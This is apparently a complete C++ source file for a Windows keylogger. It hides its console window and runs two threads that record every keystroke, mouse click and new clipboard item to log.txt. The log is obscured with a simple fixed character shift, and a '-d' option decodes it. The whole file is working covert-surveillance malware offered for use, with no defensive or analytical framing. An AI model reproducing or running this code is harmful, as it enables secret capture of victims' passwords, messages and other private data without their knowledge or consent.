```c++
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <thread>

using namespace std;

// Function prototypes
bool isCapsLock();
bool isShift();
void save(const string& input, int key);
bool specialKey(char key, int passwd);
void encrypt(const string& filename, int key);
void decrypt(const string& filename, int key);
string getClipboardText();
void clipboardLogger(int key);
void keyLogger(int key);

/**
 * @brief Checks if the Caps Lock key is pressed.
 * 
 * The function checks the state of the Caps Lock key by calling the GetKeyState function with the VK_CAPITAL parameter.
 * It masks the return value with 1 to check if the least significant bit is set, which indicates the toggle state.
 * 
 * @pre The function is called.
 * @post The Caps Lock key state is checked.
 * 
 * @return True if the Caps Lock key is pressed, false otherwise.
 */
bool isCapsLock() {
    return (GetKeyState(VK_CAPITAL) & 1) != 0;
}

/**
 * @brief Checks if the Shift key is pressed.
 * 
 * The function checks the state of the Shift key by calling the GetKeyState function with the VK_SHIFT parameter.
 * It masks the return value with 0x8000 to check if the most significant bit is set, which indicates that physical press of the key.
 * 
 * @pre The function is called.
 * @post The Shift key state is checked.
 * 
 * @return True if the Shift key is pressed, false otherwise.
 */
bool isShift() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

/**
 * @brief Saves the input string to a log file, encrypting it with a random shift.
 * 
 * The function opens the log file in append mode and writes the encrypted version of each character in the input string to the file.
 * The encryption is done by adding a mod10 shift to the ASCII value of each character.
 * 
 * @param input The string to be saved to the log file.
 * @param key The key used to generate the random shift for encryption.
 */
void save(const string& input, int key) {
    ofstream outFile("log.txt", ios::app | ios::binary);
    if (!outFile.is_open()) {
        cout << "Error opening log file for writing." << endl;
        return;
    }

    for (char c : input) {
        int shift = 1 + key % 10;  // Calculate the shift
        outFile.put(c + shift);  // Save the key pressed + shift to the file
    }

    outFile.close();
}

/**
 * @brief Checks if the key is a special key and saves its name to the log file.
 * 
 * The function checks if the key is a special key (e.g., space, enter, shift, backspace, etc.) and saves its name to the log file.
 * 
 * @param key The special key to be checked.
 * @param passwd The key used to encrypt the log file.
 * 
 * @return True if the key is a special key, false otherwise.
 */
bool specialKey(char key, int passwd) {
    switch (key) {
        case VK_SPACE:
            save(" ", passwd);
            return true;
        case VK_RETURN:
            save("\n", passwd);
            return true;
        case VK_SHIFT:
            save("[SHIFT]", passwd);
            return true;
        case VK_BACK:
            save("[BACKSPACE]", passwd);
            return true;
        case VK_RBUTTON:
            save("[R_CLICK]", passwd);
            return true;
        case VK_LBUTTON:
            save("[L_CLICK]", passwd);
            return true;
        case VK_CAPITAL:
            save("[CAPS_LOCK]", passwd);
            return true;
        case VK_TAB:
            save("[TAB]", passwd);
            return true;
        case VK_UP:
            save("[UP_ARROW_KEY]", passwd);
            return true;
        case VK_DOWN:
            save("[DOWN_ARROW_KEY]", passwd);
            return true;
        case VK_LEFT:
            save("[LEFT_ARROW_KEY]", passwd);
            return true;
        case VK_RIGHT:
            save("[RIGHT_ARROW_KEY]", passwd);
            return true;
        case VK_CONTROL:
            save("[CONTROL]", passwd);
            return true;
        case VK_MENU:
            save("[ALT]", passwd);
            return true;
        default:
            return false;
    }
}

/**
 * @brief Decrypts a file using a specified key.
 * 
 * This function takes a filename and a key as input and decrypts the contents of the file using the key.
 * The decrypted content is then written to a new file named "decrypted.txt".
 * 
 * @param filename The name of the file to be decrypted.
 * @param key The key used for decryption.
 */
void decrypt(const string& filename, int key) {
    ifstream file(filename, ios::binary);
    ofstream decrypted("decrypted.txt");

    if (!file.is_open()) {
        cout << "Error opening file." << endl;
        return;
    }

    if (!decrypted.is_open()) {
        cout << "Error creating file." << endl;
        return;
    }

    char c;
    while (file.get(c)) {
        int shift = 1 + key % 10;  // Calculate the shift
        decrypted.put(c - shift);  // Decrypt and write to the new file
    }

    cout << "File decrypted successfully." << endl;

    file.close();
    decrypted.close();
}

/**
 * @brief Retrieves the text currently stored in the clipboard.
 * 
 * This function opens the clipboard and retrieves the text data stored in it.
 * It returns an empty string if the clipboard cannot be opened or if there is no text data available.
 * 
 * @return The text currently stored in the clipboard.
 */
string getClipboardText() {
    string text = "";

    if (!OpenClipboard(nullptr)) {
        return text;
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != nullptr) {
        wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pwszText != nullptr) {
            wstring ws(pwszText);
            text = string(ws.begin(), ws.end());
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();

    return text;
}

/**
 * @brief Logs the content of the clipboard.
 * 
 * This function continuously monitors the clipboard for changes and logs the content
 * whenever a new item is added. The logged content is saved along with the provided key.
 * 
 * @param key The key used to encrypt the log file.
 */
void clipboardLogger(int key) {
    string previousClipboardContent;

    while (true) {
        Sleep(1000);

        string currentClipboardContent = getClipboardText();

        if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {
            save("\n[+]Clipboard: " + currentClipboardContent + "\n", key);
            previousClipboardContent = currentClipboardContent;
        }
    }
}

/**
 * @brief Logs the keys pressed by the user.
 * 
 * This function continuously monitors the keys pressed by the user and logs them to a file.
 * The logged keys are encrypted using the provided key.
 * 
 * @param passwd The key used to encrypt the log file.
 */
void keyLogger(int passwd) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(50);

        for (char key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == 0xFFFF8001) {  // Check if a key has been pressed
                if (!specialKey(key, passwd)) {
                    string str(1, key);

                    if (!(isCapsLock() || isShift())) str[0] = tolower(str[0]);
                    else if (isCapsLock() && isShift()) str[0] = tolower(str[0]);

                    save(str, passwd);
                }
            }
        }
    }
}

int main(int argc, char** argv) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    int key = 88;  // Define your key here (same as the example code)

    // Check for command line arguments
    if (argc == 2) {
        cout << "You need 2 arguments to decrypt the log file." << endl;
        return 1;
    } else if (argc == 3) {
        if (string(argv[1]) == "-d") {
            decrypt("log.txt", stoi(argv[2]));
            return 0;
        } else {
            cout << "Invalid argument." << endl;
            return 1;
        }
    } else if (argc > 3) {
        cout << "Too many arguments." << endl;
        return 1;
    }

    // Launch clipboard and key logger threads
    thread clipboardThread(clipboardLogger, key);
    thread keyLoggerThread(keyLogger, key);

    clipboardThread.join();
    keyLoggerThread.join();

    return 0;
}
```